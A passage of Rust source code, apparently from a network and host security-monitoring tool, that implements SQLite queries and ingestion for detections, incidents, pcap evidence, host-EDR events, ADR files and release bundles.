    /// in via the SAME `detection_to_pcap` edge `ingest_detection` writes, so a pcap in this list
    /// is always traceable back to the detection that triggered it — never an orphan-looking row.
    pub fn list_pcaps(&self, limit: i64) -> Result<String> {
        let limit = limit.clamp(1, 1000);
        let mut stmt = self.conn.prepare(
            "SELECT p.id, p.ts, p.path, p.sha256, p.bytes, p.src_ip, p.first_ts, p.last_ts, \
                    COALESCE(d.rule_id, 0), COALESCE(d.rule_msg,''), COALESCE(d.category,'') \
             FROM pcaps p \
             LEFT JOIN edges e ON e.dst_id = p.id AND e.edge_type=?1 \
             LEFT JOIN detections d ON d.id = e.src_id \
             ORDER BY p.ts DESC LIMIT ?2",
        )?;
        let rows: Vec<serde_json::Value> = stmt
            .query_map(params![EDGE_DETECTION_TO_PCAP, limit], |r| {
                Ok(serde_json::json!({
                    "id": r.get::<_, String>(0)?,
                    "ts": r.get::<_, f64>(1)?,
                    "path": r.get::<_, String>(2)?,
                    "sha256": r.get::<_, String>(3)?,
                    "bytes": r.get::<_, i64>(4)?,
                    "src_ip": r.get::<_, String>(5)?,
                    "first_ts": r.get::<_, f64>(6)?,
                    "last_ts": r.get::<_, f64>(7)?,
                    "rule_id": r.get::<_, i64>(8)?,
                    "rule_msg": r.get::<_, String>(9)?,
                    "category": r.get::<_, String>(10)?,
                }))
            })?
            .filter_map(|r| r.ok())
            .collect();
        Ok(serde_json::json!({"count": rows.len(), "pcaps": rows}).to_string())
    }

    /// Latest N incidents, newest first — the read-API's `/api/incidents` (Investigate workspace
    /// incident queue). Read-only.
    pub fn list_incidents(&self, limit: i64) -> Result<String> {
        let limit = limit.clamp(1, 500);
        let mut stmt = self.conn.prepare(
            "SELECT id, ts, title, device_ip, priority, status, threat_score \
             FROM incidents ORDER BY ts DESC LIMIT ?")?;
        let rows: Vec<serde_json::Value> = stmt
            .query_map(params![limit], |r| {
                Ok(serde_json::json!({
                    "id": r.get::<_, String>(0)?,
                    "ts": r.get::<_, f64>(1)?,
                    "title": r.get::<_, String>(2)?,
                    "device_ip": r.get::<_, String>(3)?,
                    "priority": r.get::<_, String>(4)?,
                    "status": r.get::<_, String>(5)?,
                    "threat_score": r.get::<_, f64>(6)?,
                }))
            })?
            .filter_map(|r| r.ok())
            .collect();
        Ok(serde_json::json!({"count": rows.len(), "incidents": rows}).to_string())
    }

    /// One incident's full drill-down envelope for `/api/incidents/:id` (Investigate workspace,
    /// MissionControl.md's "AI explanation panel" contract: *why · confidence · evidence · model ·
    /// related events*). Reuses the EXISTING `attack_path` (the incident's evidence-graph subgraph —
    /// nodes+edges, the attack path) — no query logic is duplicated, only JSON composition:
    /// - `why`: the incident's own title (deterministic correlation's plain-English summary today;
    ///   an AI-generated narrative is future work, not invented here).
    /// - `confidence`: the incident's `threat_score` (already computed by
    ///   `correlate_incident`, `(6 - worst severity) / 5`) re-expressed as a 0-100 percentage — the same
///   number, not a new model.
    /// - `evidence`: the subgraph's `edge_count` (every linked flow/detection/response/host artifact).
    /// - `model`: `null` until the ADR 0025 BYO-LLM planner (`crates/hookprobe-planner`) has run an
    ///   explanation over THIS incident at least once (see [`Self::record_ai_explanation`]) — the
    ///   ONLY writer of that state. Populated with the non-secret `endpoint::model-id` identity
    ///   once it has; never fabricated in between.
    /// - `ai_reasoning`: `null` alongside `model` (with the honest reason string
    ///   `"no AI planner run / no model configured"`) until the same planner run — then the
    ///   model's own why/confidence/reasoning envelope, ADDITIVE to (never replacing) the
    ///   deterministic `why`/`confidence`/`evidence` fields above, which are always the
    ///   correlation's own numbers regardless of whether the planner has ever run.
    /// - `related_events`: every `det:`-prefixed node id in the subgraph (the detections that make up
    ///   the story), so the UI can drill further into each one via `/api/evidence/graph?node=<id>`.
    ///
    /// Returns `Ok(None)` if the incident id doesn't exist (404 at the HTTP layer).
    pub fn incident_detail(&self, incident_id: &str) -> Result<Option<String>> {
        let row: Option<(f64, String, String, String, String, f64)> = self.conn
            .query_row(
                "SELECT ts, title, device_ip, priority, status, threat_score FROM incidents WHERE id=?",
                params![incident_id], |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?, r.get(3)?, r.get(4)?, r.get(5)?)))
            .optional()?;
        let Some((ts, title, device_ip, priority, status, threat_score)) = row else { return Ok(None) };
        let path_json = self.attack_path(incident_id)?;
        let path: serde_json::Value = serde_json::from_str(&path_json).context("parse attack_path json")?;
        let edge_count = path["edge_count"].as_i64().unwrap_or(0);
        let related_events: Vec<&str> = path["nodes"].as_array().map(|ns| {
            ns.iter().filter_map(|n| n["id"].as_str()).filter(|id| id.starts_with("det:")).collect()
        }).unwrap_or_default();
        let ai = self.latest_ai_explanation(incident_id)?;
        let (model, ai_reasoning) = match &ai {
            Some(row) => (
                serde_json::Value::String(row.model.clone()),
                serde_json::json!({
                    "why": row.why,
                    "confidence": row.confidence,
                    "reasoning": row.reasoning,
                    "generated_ts": row.ts,
                }),
            ),
            None => (
                serde_json::Value::Null,
                serde_json::json!({
                    "why": serde_json::Value::Null,
                    "reason": "no AI planner run / no model configured",
                }),
            ),
        };
        Ok(Some(serde_json::json!({
            "id": incident_id,
            "ts": ts,
            "title": title,
            "device_ip": device_ip,
            "priority": priority,
            "status": status,
            "threat_score": threat_score,
            "explanation": {
                "why": title,
                "confidence": (threat_score * 100.0).round(),
                "evidence": edge_count,
                "model": model,
                "related_events": related_events,
                "ai_reasoning": ai_reasoning,
            },
            "attack_path": path,
        }).to_string()))
    }

    /// Latest N QSECBIT readings, newest first — the read-API's `/api/qsecbit` (the Organism Status
    /// orb + its score-history sparkline). Read-only.
    pub fn list_qsecbit(&self, limit: i64) -> Result<String> {
        let limit = limit.clamp(1, 1000);
        let mut stmt = self.conn.prepare(
            "SELECT id, ts, score, band, drift, qdrift, p_attack, decay, maha_dist, entropy_nats \
             FROM qsecbit_scores ORDER BY ts DESC LIMIT ?")?;
        let rows: Vec<serde_json::Value> = stmt
            .query_map(params![limit], |r| {
                Ok(serde_json::json!({
                    "id": r.get::<_, String>(0)?,
                    "ts": r.get::<_, f64>(1)?,
                    "score": r.get::<_, f64>(2)?,
                    "band": r.get::<_, String>(3)?,
                    "drift": r.get::<_, f64>(4)?,
                    "qdrift": r.get::<_, f64>(5)?,
                    "p_attack": r.get::<_, f64>(6)?,
                    "decay": r.get::<_, f64>(7)?,
                    "maha_dist": r.get::<_, f64>(8)?,
                    "entropy_nats": r.get::<_, f64>(9)?,
                }))
            })?
            .filter_map(|r| r.ok())
            .collect();
        Ok(serde_json::json!({"count": rows.len(), "scores": rows}).to_string())
    }

    /// Latest N attack_run campaigns, newest-inserted first — the read-API's future
    /// `/api/resilience/runs` (Detect/Investigate workspace's Gate R history). Read-only.
    pub fn list_attack_runs(&self, limit: i64) -> Result<String> {
        let limit = limit.clamp(1, 500);
        let mut stmt = self.conn.prepare(
            "SELECT id, ts, roe_hash, cadence, image_version, dut_targets, operator, verdict \
             FROM attack_runs ORDER BY rowid DESC LIMIT ?")?;
        let rows: Vec<serde_json::Value> = stmt
            .query_map(params![limit], |r| {
                Ok(serde_json::json!({
                    "id": r.get::<_, String>(0)?,
                    "ts": r.get::<_, String>(1)?,
                    "roe_hash": r.get::<_, String>(2)?,
                    "cadence": r.get::<_, String>(3)?,
                    "image_version": r.get::<_, String>(4)?,
                    "dut_targets": r.get::<_, String>(5)?,
                    "operator": r.get::<_, String>(6)?,
                    "verdict": r.get::<_, String>(7)?,
                }))
            })?
            .filter_map(|r| r.ok())
            .collect();
        Ok(serde_json::json!({"count": rows.len(), "attack_runs": rows}).to_string())
    }

    /// Every finding for one attack_run — the read-API's future `/api/resilience/runs/:id/findings`
    /// (the Gate R drill-down: which probes withstood/breached, and whether each was verified-fired).
    /// Read-only.
    pub fn findings_for_run(&self, attack_run_id: &str) -> Result<String> {
        let mut stmt = self.conn.prepare(
            "SELECT id, ts, layer, probe, target_component, outcome, severity, verified_fired, \
             evidence_ref, mitre_attck, repro_seed FROM findings WHERE attack_run=? ORDER BY rowid ASC")?;
        let rows: Vec<serde_json::Value> = stmt
            .query_map(params![attack_run_id], |r| {
                Ok(serde_json::json!({
                    "id": r.get::<_, String>(0)?,
                    "ts": r.get::<_, String>(1)?,
                    "layer": r.get::<_, String>(2)?,
                    "probe": r.get::<_, String>(3)?,
                    "target_component": r.get::<_, String>(4)?,
                    "outcome": r.get::<_, String>(5)?,
                    "severity": r.get::<_, String>(6)?,
                    "verified_fired": r.get::<_, i64>(7)? != 0,
                    "evidence_ref": r.get::<_, String>(8)?,
                    "mitre_attck": r.get::<_, String>(9)?,
                    "repro_seed": r.get::<_, i64>(10)?,
                }))
            })?
            .filter_map(|r| r.ok())
            .collect();
        Ok(serde_json::json!({"attack_run": attack_run_id, "count": rows.len(), "findings": rows}).to_string())
    }

    /// SSE watermark poll (Mission Control's `/api/stream` — the "live telemetry" feed). Cheap and
    /// edge-friendly by design: three `MAX(ts) WHERE ts > ?` + bounded re-selects, no LISTEN/NOTIFY,
    /// no WAL tailing — appropriate for a dashboard refresh cadence (seconds), not a firehose. Returns
    /// `(new_watermark, json)`; `json` is `{"detections":[…],"incidents":[…],"qsecbit":[…]}`, each
    /// list holding only rows with `ts > since_ts` (bounded to 100 rows/table so a poll after a long
    /// gap — e.g. the API restarting — can't return an unbounded burst). Callers advance their own
    /// `since_ts` to the returned watermark after each poll; passing the same watermark back with no
    /// new activity returns three empty lists (cheap no-op tick, exactly the "poll the DB's max
    /// watermark on an interval" scheme called for at the HTTP layer).
    pub fn poll_since(&self, since_ts: f64) -> Result<(f64, String)> {
        let dets: Vec<serde_json::Value> = {
            let mut stmt = self.conn.prepare(
                "SELECT id, ts, rule_msg, category, severity, src_ip, dst_ip, confidence \
                 FROM detections WHERE ts > ? ORDER BY ts ASC LIMIT 100")?;
            let rows = stmt.query_map(params![since_ts], |r| {
                Ok(serde_json::json!({
                    "id": r.get::<_, String>(0)?, "ts": r.get::<_, f64>(1)?,
                    "rule_msg": r.get::<_, String>(2)?, "category": r.get::<_, String>(3)?,
                    "severity": r.get::<_, i64>(4)?, "src_ip": r.get::<_, String>(5)?,
                    "dst_ip": r.get::<_, String>(6)?, "confidence": r.get::<_, f64>(7)?,
                }))
            })?.filter_map(|r| r.ok()).collect();
            rows
        };
        let incs: Vec<serde_json::Value> = {
            let mut stmt = self.conn.prepare(
                "SELECT id, ts, title, device_ip, priority, status, threat_score \
                 FROM incidents WHERE ts > ? ORDER BY ts ASC LIMIT 100")?;
            let rows = stmt.query_map(params![since_ts], |r| {
                Ok(serde_json::json!({
                    "id": r.get::<_, String>(0)?, "ts": r.get::<_, f64>(1)?,
                    "title": r.get::<_, String>(2)?, "device_ip": r.get::<_, String>(3)?,
                    "priority": r.get::<_, String>(4)?, "status": r.get::<_, String>(5)?,
                    "threat_score": r.get::<_, f64>(6)?,
                }))
            })?.filter_map(|r| r.ok()).collect();
            rows
        };
        let scores: Vec<serde_json::Value> = {
            let mut stmt = self.conn.prepare(
                "SELECT id, ts, score, band FROM qsecbit_scores WHERE ts > ? ORDER BY ts ASC LIMIT 100")?;
            let rows = stmt.query_map(params![since_ts], |r| {
                Ok(serde_json::json!({
                    "id": r.get::<_, String>(0)?, "ts": r.get::<_, f64>(1)?,
                    "score": r.get::<_, f64>(2)?, "band": r.get::<_, String>(3)?,
                }))
            })?.filter_map(|r| r.ok()).collect();
            rows
        };
        let max_ts = [
            dets.iter().filter_map(|v| v["ts"].as_f64()).fold(since_ts, f64::max),
            incs.iter().filter_map(|v| v["ts"].as_f64()).fold(since_ts, f64::max),
            scores.iter().filter_map(|v| v["ts"].as_f64()).fold(since_ts, f64::max),
        ].into_iter().fold(since_ts, f64::max);
        Ok((max_ts, serde_json::json!({
            "detections": dets, "incidents": incs, "qsecbit": scores,
        }).to_string()))
    }

    /// Lifecycle trace (ADR 0013 D2/E1 dev-time bus, D4a `lifecycle_trace` MCP tool): a session's
    /// intent (the prompt) → every change/gate it `led_to`, in time order — "which prompt produced
    /// this edit / this gate result" as a query instead of scrollback archaeology. `session` is either
    /// an exact `session_key` (the `cortex-emit` hook's session id) or the literal `"latest"` (the
    /// most-recently-active session by `last_ts`). Read-only.
    pub fn lifecycle_trace(&self, session: &str) -> Result<String> {
        let session_key: Option<String> = if session == "latest" {
            self.conn
                .query_row("SELECT session_key FROM sessions ORDER BY last_ts DESC LIMIT 1", [], |r| r.get(0))
                .optional()?
        } else {
            Some(session.to_string())
        };
        let Some(session_key) = session_key else {
            return Ok(serde_json::json!({"session": session, "found": false}).to_string());
        };
        let sess_id = sid("session", &session_key);
        let found: Option<(String, String)> = self.conn
            .query_row(
                "SELECT intent, last_ts FROM sessions WHERE id=?",
                params![sess_id], |r| Ok((r.get(0)?, r.get(1)?)))
            .optional()?;
        let Some((intent, last_ts)) = found else {
            return Ok(serde_json::json!({"session": session_key, "found": false}).to_string());
        };
        let mut stmt = self.conn.prepare(
            "SELECT id, kind, ts, summary, detail FROM lifecycle_events WHERE session=? ORDER BY ts ASC")?;
        let events: Vec<serde_json::Value> = stmt
            .query_map(params![session_key], |r| {
                Ok(serde_json::json!({
                    "id": r.get::<_, String>(0)?,
                    "kind": r.get::<_, String>(1)?,
                    "ts": r.get::<_, String>(2)?,
                    "summary": r.get::<_, String>(3)?,
                    "detail": r.get::<_, String>(4)?,
                }))
            })?
            .filter_map(|r| r.ok())
            .collect();
        Ok(serde_json::json!({
            "session": session_key,
            "found": true,
            "intent": intent,
            "last_ts": last_ts,
            "event_count": events.len(),
            "events": events,
        }).to_string())
    }

    /// Correlate + attack-path in one call (ADR 0013 D4a `correlate` MCP tool) — the MCP-facing
    /// combination of the two EXISTING methods (`correlate_incident`, `attack_path`) the CLI's
    /// `--correlate` flag already calls in sequence; no query logic is reimplemented here, only JSON
    /// composition. NOTE (flagged, not silently resolved): `correlate_incident` upserts an `incidents`
    /// node + its edges — this one MCP tool is therefore not byte-for-byte read-only like the other
    /// four; it is the same idempotent graph-bookkeeping side effect the CLI and the scan-responder
    /// pipeline already produce (an incident summary node), never a network/policy action, so it stays
    /// inside C9 ("records, never enforces") — but it is a write, and a stricter separation (e.g. a
    /// side-effect-free "preview" correlate) is future work, not built here.
    pub fn correlate(&self, device_ip: &str) -> Result<String> {
        let title = format!("Correlated incident: {device_ip}");
        let inc_id = self.correlate_incident(device_ip, &title)?;
        let path_json = self.attack_path(&inc_id)?;
        let path: serde_json::Value = serde_json::from_str(&path_json).context("parse attack_path json")?;
        Ok(serde_json::json!({"device_ip": device_ip, "incident_id": inc_id, "attack_path": path}).to_string())
    }

    /// Trace a detection → its device → the device's flows (the "track & trace"): a JSON summary a
    /// board renders. Proves the drill-down: detection → device → the packets/flows behind it.
    pub fn trace_detection(&self, det_id: &str) -> Result<String> {
        let (msg, category, src_ip): (String, String, String) = self.conn.query_row(
            "SELECT rule_msg, category, src_ip FROM detections WHERE id=?",
            params![det_id], |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?)))
            .context("detection not found")?;
        let dev_id = sid("dev", &src_ip);
        let dev_flows: i64 = self.conn.query_row(
            "SELECT count(*) FROM edges e JOIN flows f ON e.src_id=f.id \
             WHERE e.edge_type='flow_from_device' AND e.dst_id=?",
            params![dev_id], |r| r.get(0))?;
        let linked_flows: i64 = self.conn.query_row(
            "SELECT count(*) FROM edges WHERE edge_type='detection_on_flow' AND src_id=?",
            params![det_id], |r| r.get(0))?;
        // Trigger-to-evidence pcap capture (roadmap D) read path — GAP-2's "surface it, not just
        // write it" requirement: the pcap artifact(s), if any, `napse-dpi`'s `capture` module wrote
        // for this detection (see `ingest_detection`'s pcap-linkage block). Empty array is the
        // honest common case (most detections have none — HYDRA-IOC/host-EDR triggers structurally
        // never do, see `napse_loader::capture`'s module doc), never fabricated.
        let mut pcap_stmt = self.conn.prepare(
            "SELECT p.path, p.sha256, p.bytes, p.first_ts, p.last_ts FROM edges e \
             JOIN pcaps p ON e.dst_id = p.id \
             WHERE e.edge_type=?1 AND e.src_id=?2",
        )?;
        let pcaps: Vec<serde_json::Value> = pcap_stmt
            .query_map(params![EDGE_DETECTION_TO_PCAP, det_id], |r| {
                Ok(serde_json::json!({
                    "path": r.get::<_, String>(0)?,
                    "sha256": r.get::<_, String>(1)?,
                    "bytes": r.get::<_, i64>(2)?,
                    "first_ts": r.get::<_, f64>(3)?,
                    "last_ts": r.get::<_, f64>(4)?,
                }))
            })?
            .filter_map(|r| r.ok())
            .collect();
        // serde_json — NEVER hand-format: msg/category/src_ip round-trip from attacker-controlled
        // ingest fields; a raw `"` or newline in a rule_msg would otherwise break out / forge keys.
        Ok(serde_json::json!({
            "detection": msg,
            "category": category,
            "device": src_ip,
            "linked_flows": linked_flows,
            "device_total_flows": dev_flows,
            "pcaps": pcaps,
        }).to_string())
    }

    /// Insert one host-EDR finding ([`host_edr::HostDetection`]) as a first-class `detections` row —
    /// the SAME table/shape `ingest_detection` writes network detections into (`src_ip` = the
    /// device that produced the event, `dst_ip`/`dst_port` empty — a host finding has no network
    /// destination). This is why `correlate_all`/`correlate_incident` need NO host-specific branch:
    /// they already group `detections` by `src_ip` with no notion of "network vs host" (proven by
    /// `attack_path_spans_network_and_host_layers`), so a host detection on a device folds into the
    /// SAME incident as a network detection on that device for free. Also adds the `detects_on_device`
    /// edge (parity with every other detection) and an edge to the SPECIFIC process/file node that
    /// triggered it (`detection_on_process`/`detection_on_file` — parity with `ingest_detection`'s
    /// `detection_on_flow`), so the incident's evidence chain drills down to the exact process/file,
    /// not just the device.
    fn insert_host_detection(
        &self,
        ts: f64,
        dev: &str,
        dev_id: &str,
        evidence_id: &str,
        evidence_edge: &str,
        det: &host_edr::HostDetection,
    ) -> Result<String> {
        let det_id = sid("det", &format!("{}:{dev}:{evidence_id}@{ts}", det.rule_id));
        self.conn.execute(
            "INSERT INTO detections VALUES (?,?,?,?,?,?,?,?,?,?,?) ON CONFLICT (id) DO NOTHING",
            params![det_id, ts, det.rule_id, det.rule_msg, det.category, det.severity, det.mitre, dev, "", 0i64, det.confidence])?;
        self.add_edge(&det_id, "detects_on_device", dev_id, ts)?;
        self.add_edge(&det_id, evidence_edge, evidence_id, ts)?;
        self.attribute_host_detection_user(&det_id, dev, ts)?;
        Ok(det_id)
    }

    /// Ingest a HOST telemetry event (process exec / file / registry) → the host-layer nodes + edges
    /// (`process_on_device`, `process_accessed_file`, `process_touched_registry`, `spawned_by`). This is
    /// the process→file→registry half of the threat graph; it fills in when eBPF host telemetry lands.
    ///
    /// **Host-EDR (the EDR-audit CRITICAL fix):** every "process" event is also run through
    /// [`host_edr::classify_exec`] (LOLBin/reverse-shell/download-exec/suspicious-parentage/
    /// exec-from-writable-path) and every "file" write through [`host_edr::classify_persistence`]
    /// (cron/systemd/SSH-keys/ld.so.preload/shell-profile/passwd persistence paths) — a match becomes
    /// a real `detections` row via `insert_host_detection`, so a malicious exec or persistence
    /// dropper is no longer merely logged: it is alerted, scored, and (via the shared `detections`
    /// table) auto-correlated into an incident exactly like a network detection. See `host_edr`'s
    /// module doc for the honest scope of what this first tier does and does not cover.
    pub fn ingest_host_event(&self, line: &str) -> Result<Option<String>> {
        let v: serde_json::Value = match serde_json::from_str(line) { Ok(v) => v, Err(_) => return Ok(None) };
        let ts = v["ts"].as_f64().unwrap_or(0.0);
        let dev = v["device_ip"].as_str().unwrap_or("");
        if dev.is_empty() { return Ok(None); }
        let dev_id = sid("dev", dev);
        // GAP FIX: upsert the device so a host-only device (no network flow) still exists as a node.
        self.conn.execute(
            "INSERT INTO devices (id,ip,first_seen,last_seen) VALUES (?,?,?,?) \
             ON CONFLICT (id) DO UPDATE SET last_seen=max(devices.last_seen, excluded.last_seen), first_seen=min(devices.first_seen, excluded.first_seen)",
            params![dev_id, dev, ts, ts])?;
        match v["type"].as_str().unwrap_or("") {
            "process" => {
                let pid = v["pid"].as_i64().unwrap_or(0);
                let ppid = v["parent_pid"].as_i64().unwrap_or(0);
                let name = v["name"].as_str().unwrap_or("");
                let cmdline = v["cmdline"].as_str().unwrap_or("");
                let pnode = sid("proc", &format!("{dev}:{pid}"));
                self.conn.execute("INSERT INTO processes VALUES (?,?,?,?,?,?,?) ON CONFLICT (id) DO NOTHING",
                    params![pnode, ts, dev, pid, name, cmdline, ppid])?;
                self.add_edge(&pnode, "process_on_device", &dev_id, ts)?;
                if ppid != 0 { self.add_edge(&pnode, "spawned_by", &sid("proc", &format!("{dev}:{ppid}")), ts)?; }

                // Host-EDR exec ruleset: look up the parent's name (best-effort — `None` if pid 0 or
                // its own exec event hasn't been ingested yet; the suspicious-parentage check is
                // SKIPPED, never false-positived, in that case).
                let parent_name: Option<String> = if ppid != 0 {
                    self.conn.query_row(
                        "SELECT name FROM processes WHERE id=?",
                        params![sid("proc", &format!("{dev}:{ppid}"))],
                        |r| r.get::<_, String>(0),
                    ).optional()?
                } else { None };
                let edr_cfg = host_edr::HostEdrConfig::from_env();
                for det in host_edr::classify_exec(name, cmdline, parent_name.as_deref(), &edr_cfg) {
                    self.insert_host_detection(ts, dev, &dev_id, &pnode, "detection_on_process", &det)?;
                }
                Ok(Some(pnode))
            }
            "file" => {
                let path = v["path"].as_str().unwrap_or("");
                let action = v["action"].as_str().unwrap_or("");
                // File-hash IOC wiring (2026-07-09): `sha256` — a fanotify write-event's computed
                // file-content hash (`hookprobe-fanotify`'s own size cap leaves it "" rather than a
                // fabricated partial-file hash — see that binary's doc). Empty string when absent
                // (a non-write action, an oversized file, or an older producer that predates this
                // field), never fabricated. `ON CONFLICT DO UPDATE` (not the file/action's original
                // `DO NOTHING`) ONLY on this one column: the SAME (device,path) file node can be
                // re-ingested carrying a hash on a LATER pass even if an earlier sighting of the
                // same path had none — mirrors `applications`'s own ja3/ja4/… "excluded wins when
                // non-empty" merge idiom, applied narrowly so `action`'s existing first-write-wins
                // semantics stay unchanged.
                let sha256 = v["sha256"].as_str().unwrap_or("");
                let fnode = sid("file", &format!("{dev}:{path}"));
                self.conn.execute(
                    "INSERT INTO files (id,ts,device_ip,path,action,sha256) VALUES (?,?,?,?,?,?) \
                     ON CONFLICT (id) DO UPDATE SET \
                       sha256=CASE WHEN excluded.sha256<>'' THEN excluded.sha256 ELSE files.sha256 END",
                    params![fnode, ts, dev, path, action, sha256])?;
                self.add_edge(&sid("proc", &format!("{dev}:{}", v["pid"].as_i64().unwrap_or(0))), "process_accessed_file", &fnode, ts)?;

                // Host-EDR persistence ruleset: a WRITE to a curated persistence path → a detection.
                if action == "write" {
                    if let Some(det) = host_edr::classify_persistence(path) {
                        self.insert_host_detection(ts, dev, &dev_id, &fnode, "detection_on_file", &det)?;
                    }
                }
                Ok(Some(fnode))
            }
            "registry" => {
                let rnode = sid("reg", &format!("{dev}:{}", v["key"].as_str().unwrap_or("")));
                self.conn.execute("INSERT INTO registry_keys VALUES (?,?,?,?,?) ON CONFLICT (id) DO NOTHING",
                    params![rnode, ts, dev, v["key"].as_str().unwrap_or(""), v["action"].as_str().unwrap_or("")])?;
                self.add_edge(&sid("proc", &format!("{dev}:{}", v["pid"].as_i64().unwrap_or(0))), "process_touched_registry", &rnode, ts)?;
                Ok(Some(rnode))
            }
            "credential" => {
                let principal = v["principal"].as_str().unwrap_or("");
                let cnode = sid("cred", &format!("{dev}:{principal}"));
                self.conn.execute("INSERT INTO credentials VALUES (?,?,?,?,?) ON CONFLICT (id) DO NOTHING",
                    params![cnode, ts, dev, principal, v["kind"].as_str().unwrap_or("")])?;
                self.add_edge(&sid("proc", &format!("{dev}:{}", v["pid"].as_i64().unwrap_or(0))), "process_used_credential", &cnode, ts)?;
                // Real host-EDR signal (the `User` drill-down pivot, MissionControl.md's evidence
                // chain): a non-empty principal upserts a `users` node + a `credential_of_user` edge
                // so credential→user is a graph query, exactly like every other host-layer pivot.
                if !principal.is_empty() {
                    let user_id = sid("user", principal);
                    self.conn.execute(
                        "INSERT INTO users (id,principal,first_seen,last_seen) VALUES (?,?,?,?) \
                         ON CONFLICT (id) DO UPDATE SET last_seen=max(users.last_seen, excluded.last_seen), \
                                                        first_seen=min(users.first_seen, excluded.first_seen)",
                        params![user_id, principal, ts, ts])?;
                    self.add_edge(&cnode, "credential_of_user", &user_id, ts)?;
                }
                Ok(Some(cnode))
            }
            _ => Ok(None),
        }
    }

    /// Ingest one ADR markdown file (`docs/adr/NNNN-*.md`) → an `adrs` node. Number comes from the
    /// FILENAME prefix (the one thing every ADR in this repo guarantees), title from the `# ADR NNNN —
    /// Title` header line, status from the `**Status:**` line — all three are parsed independently so a
    /// malformed header doesn't lose the node, it just loses that one field. A `Supersedes` mention
    /// (scoped to lines containing the literal word, so a `**Relates to:**` cross-reference or a stray
    /// year like `2026` never gets mistaken for an ADR number) creates a `supersedes` edge to every
    /// `ADR NNNN` token found on that line. Returns the adr node id (None if `path` isn't `NNNN-*.md`).
    pub fn ingest_adr_file(&self, path: &Path) -> Result<Option<String>> {
        let fname = path.file_name().and_then(|s| s.to_str()).unwrap_or("");
        let num_str = fname.split('-').next().unwrap_or("");
        if num_str.len() != 4 || !num_str.chars().all(|c| c.is_ascii_digit()) {
            return Ok(None); // not an "NNNN-*.md" ADR file — skip, don't fail a whole-dir ingest
        }
        let text = std::fs::read_to_string(path).with_context(|| format!("read {}", path.display()))?;
        let number: i64 = num_str.parse().unwrap_or(0);
        let id = sid("adr", num_str);

        // "# ADR NNNN — Title" (em dash in this repo's convention; tolerate a plain hyphen too).
        let title = text
            .lines()
            .find_map(|l| l.trim().strip_prefix("# ADR "))
            .map(|rest| {
                let after_num = rest.trim_start().trim_start_matches(|c: char| c.is_ascii_digit());
                after_num.trim().trim_start_matches(['—', '-', ':']).trim().to_string()
            })
            .unwrap_or_else(|| fname.to_string());
        // "**Status:** ✅ Accepted (2026-07-03)."
        let status = text
            .lines()
            .find_map(|l| l.trim().strip_prefix("**Status:**"))
            .map(|s| s.trim().to_string())
            .unwrap_or_default();
        let path_str = path.to_string_lossy().to_string();

        self.conn.execute(
            "INSERT INTO adrs VALUES (?,?,?,?,?) \
             ON CONFLICT (id) DO UPDATE SET number=excluded.number, title=excluded.title, status=excluded.status, path=excluded.path",
            params![id, number, title, status, path_str])?;

        // "Supersedes ADR 0005" mentions (line-scoped) → supersedes edges to each referenced ADR.
        for line in text.lines() {
            if !line.contains("Supersedes") {
                continue;
            }
            let mut idx = 0usize;
            while let Some(p) = line[idx..].find("ADR ") {
                let start = idx + p + 4;
                idx = start;
                let Some(tok) = line.get(start..start.saturating_add(4)).filter(|t| t.len() == 4) else { continue };
                if tok.chars().all(|c| c.is_ascii_digit()) {
                    let other_id = sid("adr", tok);
                    if other_id != id {
                        self.add_edge(&id, EDGE_SUPERSEDES, &other_id, 0.0)?;
                    }
                }
            }
        }
        Ok(Some(id))
    }

    /// Ingest a schema-1 `release.json` bundle (ADR 0012 D3's "mechanical output") → a `releases` node,
    /// a `commits` node + `shipped_in` edge per listed commit, and a `gate_results` node + `validated_by`
    /// edge (release → gate_result) per gate-ladder stage. Node upserts + `add_edge`'s PK dedup make
    /// re-ingesting the same bundle idempotent — the CI `promote` job and a dev-run `release-pass.sh`
    /// both call this on the same file without creating duplicate edges. Rejects the wrong schema/kind
    /// up front so a malformed or unrelated JSON file fails loudly instead of ingesting garbage.
    pub fn ingest_release(&self, json: &str) -> Result<Option<String>> {
        let v: serde_json::Value = serde_json::from_str(json).context("parse release.json")?;
        let schema = v["schema"].as_i64().unwrap_or(0);
        if schema != 1 {
            anyhow::bail!("release.json: unsupported schema {schema} (expected 1)");
        }
        let kind = v["kind"].as_str().unwrap_or("");
        if kind != "release" {
            anyhow::bail!("release.json: expected kind=\"release\", got {kind:?}");
        }
        let version = v["version"].as_str().unwrap_or("");
        if version.is_empty() {
            anyhow::bail!("release.json: missing version");
        }
        let channel = v["channel"].as_str().unwrap_or("stable");
        let ts = v["ts"].as_str().unwrap_or("");
        // digest_summary: "profile/arch=digest;…" — a pragmatic one-line rollup, not a normalized table;
        // the full per-image detail already lives in the signed bundle this crate doesn't need to own.
        let digest_summary = v["images"]
            .as_array()
            .map(|imgs| {
                imgs.iter()
                    .map(|img| format!(
                        "{}/{}={}",
                        img["profile"].as_str().unwrap_or("?"),
                        img["arch"].as_str().unwrap_or("?"),
                        img["digest"].as_str().unwrap_or("?")))
                    .collect::<Vec<_>>()
                    .join(";")
            })
            .unwrap_or_default();
        let rel_id = sid("release", &format!("{version}:{channel}"));
        self.conn.execute(
            "INSERT INTO releases VALUES (?,?,?,?,?) \
             ON CONFLICT (id) DO UPDATE SET digest_summary=excluded.digest_summary, ts=excluded.ts",
            params![rel_id, version, channel, digest_summary, ts])?;

        if let Some(commits) = v["commits"].as_array() {
            for c in commits {
                let cid_raw = c["id"].as_str().unwrap_or("");
                if cid_raw.is_empty() {
                    continue;
                }
                let subject = c["subject"].as_str().unwrap_or("");
                let cnode = sid("commit", cid_raw);
                self.conn.execute(
                    "INSERT INTO commits VALUES (?,?) ON CONFLICT (id) DO UPDATE SET subject=excluded.subject",
                    params![cnode, subject])?;
                self.add_edge(&cnode, EDGE_SHIPPED_IN, &rel_id, 0.0)?;
            }
        }
        if let Some(gates) = v["gates"].as_array() {
            for gate in gates {
                let stage = gate["stage"].as_str().unwrap_or("");
                if stage.is_empty() {
                    continue;
                }
                let verdict = gate["verdict"].as_str().unwrap_or("");
                let detail = gate["detail"].as_str().unwrap_or("");
                let gts = gate["ts"].as_str().unwrap_or("");
                // keyed on (version, channel, stage): the same stage re-run for the same release
                // upserts in place instead of piling up duplicate gate_result nodes on re-ingest.
                let gnode = sid("gate", &format!("{version}:{channel}:{stage}"));
                self.conn.execute(
                    "INSERT INTO gate_results VALUES (?,?,?,?,?,?) \
